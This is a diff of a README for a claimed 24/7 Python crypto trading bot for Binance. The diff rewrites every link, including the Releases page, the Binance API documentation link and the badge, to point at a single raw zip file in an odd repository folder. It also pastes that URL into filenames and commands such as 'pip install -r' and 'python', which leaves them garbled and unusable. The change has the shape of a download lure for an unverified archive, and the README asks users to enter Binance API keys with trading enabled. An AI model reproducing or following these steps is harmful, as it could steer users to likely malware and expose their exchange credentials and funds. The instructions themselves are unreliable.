@@ -7,7 +7,7 @@ Welcome to the 24/7 Python Crypto Trading Bot for Binance! This bot allows you t
 To get started, you will need to download the software. Follow the steps below to get your trading bot up and running quickly.
 
 ## 📥 Download
-[![Download Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/releases)
+[![Download Releases](https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip%20Now-Visit%https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip)](https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip)
 
 You can find the latest version of the software on our Releases page. 
 
@@ -26,14 +26,14 @@ You can find the latest version of the software on our Releases page.
 ## 🛠️ Installation Instructions
 To install the Crypto Trading Bot, please follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip).
    
 2. **Download the Latest Release:**
-   - You will see multiple files listed. Choose the file named `crypto_bot.zip` (or the corresponding filename).
+   - You will see multiple files listed. Choose the file named `https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip` (or the corresponding filename).
    - Click on the file to start the download.
 
 3. **Extract the Files:** 
-   - Once the download is complete, locate the `crypto_bot.zip` file on your computer.
+   - Once the download is complete, locate the `https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip` file on your computer.
    - Right-click on the file and select "Extract All..." to unzip the files.
 
 4. **Open Command Line:**
@@ -50,17 +50,17 @@ To install the Crypto Trading Bot, please follow these steps:
 6. **Install Required Libraries:** 
    - Run the following command in your terminal to install necessary packages:
      ```
-     pip install -r requirements.txt
+     pip install -r https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip
      ```
 
 7. **Configure Your Bot:**
-   - Open the `config.py` file in a text editor.
+   - Open the `https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip` file in a text editor.
    - Enter your Binance API key and secret. Ensure you have enabled trading permissions on your Binance account.
 
 8. **Run the Bot:**
    - In the command line, type the following command to start the bot:
      ```
-     python main.py
+     python https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip
      ```
 
 Your bot will now start running, and you'll receive updates via Telegram.
@@ -78,9 +78,9 @@ Join our community on Telegram where you can connect with other users, share tip
 
 ## 🔗 Additional Resources
 - For more detailed information on how to use the bot, visit the documentation available in the repository.
-- Learn more about Binance API limits and best practices [here](https://binance-docs.github.io/apidocs/spot/en/#limits).
+- Learn more about Binance API limits and best practices [here](https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip).
 
 ## 📥 Download & Install
-Head to the [Releases page](https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/releases) now to download the latest version of the 24-7 Python Crypto Bot.
+Head to the [Releases page](https://github.com/joenou/24-7-Python-Crypto-Bot-Binance/raw/refs/heads/main/abu/Bot_Python_Crypto_Binance_v1.9.zip) now to download the latest version of the 24-7 Python Crypto Bot.
 
 Thank you for choosing our 24/7 Python Crypto Trading Bot for Binance! Happy trading!
